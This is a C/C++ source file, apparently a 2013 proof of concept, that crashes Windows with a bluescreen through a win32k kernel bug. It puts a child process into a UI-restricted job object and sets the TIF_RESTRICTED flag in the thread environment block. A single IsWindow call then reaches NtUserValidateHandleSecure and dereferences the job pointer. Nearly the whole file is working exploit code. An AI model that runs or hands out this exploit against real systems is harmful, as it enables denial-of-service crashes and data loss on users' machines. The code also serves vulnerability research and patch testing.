#include <conio.h>
#include <Windows.h>
#include <strsafe.h>
 
 
#pragma section(".shared", read, write, shared)
 
__declspec(allocate(".shared"))
HWND WindowHandle;
__declspec(allocate(".shared"))
HANDLE ChildWindowReadyEvent;
__declspec(allocate(".shared"))
HANDLE ParentProcess;
 
 
int go_first_instance()
{
    wprintf(
        L"IsHandleEntrySecure_w32job_dereference_bsod\n"
        L"@sixtyvividtails                 2013-11-12\n"
        L"\n");
 
    // Make job for second process, and set some restrictions, so 'W32Job' field of 'tagPROCESSINFO' gets filled.
    HANDLE job = CreateJobObject(NULL, NULL);
    JOBOBJECT_BASIC_UI_RESTRICTIONS uiRestrictions = {JOB_OBJECT_UILIMIT_WRITECLIPBOARD};
    SetInformationJobObject(job, JobObjectBasicUIRestrictions, &uiRestrictions, sizeof(uiRestrictions));
 
    STARTUPINFO si = {sizeof(si)};
    PROCESS_INFORMATION pi = {};
    CreateProcess(NULL, GetCommandLine(), NULL, NULL, TRUE, CREATE_NO_WINDOW | CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    if (!AssignProcessToJobObject(job, pi.hProcess))
        return TerminateProcess(pi.hProcess, -1), wprintf(L"AssignProcessToJobObject failed\n");
    auto me = GetCurrentProcess();
    DuplicateHandle(me, me, pi.hProcess, &ParentProcess, SYNCHRONIZE, FALSE, 0);
    HANDLE childWindowReady = CreateEvent(NULL, FALSE, FALSE, NULL);
    DuplicateHandle(me, childWindowReady, pi.hProcess, &ChildWindowReadyEvent, EVENT_MODIFY_STATE, FALSE, 0);
    ResumeThread(pi.hThread);
 
    // Wanna call 'NtUserValidateHandleSecure', but don't wanna hardcode func offsets or api numbers.
    // So, we can make user32 to call that function for us if we fake TIF_RESTRICTED flag in local tagCLIENTINFO
    // (Teb->Win32ClientInfo, its offsets are quite stable).
    BOOL x64 = FALSE;
    __asm
    {
        xor eax, eax;
        mov ax, gs;
        mov x64, eax;
    }
    // (note: no sanity checks here)
    PDWORD threadInfoFlags = x64?
        PDWORD(__readfsdword(0xf70) + 0x800 + 0x1c):            // &teb->teb64->Win32ClientInfo.dwTIFlags
        PDWORD(__readfsdword(0x018) + 0x6cc + 0x14);            // &teb->Win32ClientInfo.dwTIFlags
    *threadInfoFlags |= 0;              // die now if ptr invalid.
 
    WaitForSingleObject(childWindowReady, 7000);
    wprintf(L"ready to bsod, HWND: %p\n"
        L"press <enter> to continue...\n", WindowHandle);
    _getwch();
 
    *threadInfoFlags |= 0x20000000;     // TIF_RESTRICTED
    IsWindow(WindowHandle);             // boom. Just indirect call to 'NtUserValidateHandleSecure()'.
    // Could as well call NtUserValidateHandleSecure(WindowHandle) directly, without messing with teb.
 
    // should not be here.
    wprintf(L"bsod failed, I am so sorry.\n");
    return 0;
}
 
 
int go_second_instance()
{
    WindowHandle = CreateWindowEx(0, L"BUTTON", L"bsod", 0, 0, 0, 0, 0, NULL, NULL, NULL, NULL);
    SetEvent(ChildWindowReadyEvent);
    WaitForSingleObject(ParentProcess, INFINITE);
    return 0;
}
 
 
int main()
{
    if (!ChildWindowReadyEvent)
        go_first_instance();
    else
        go_second_instance();
 
    return 0;
}
 
 
 
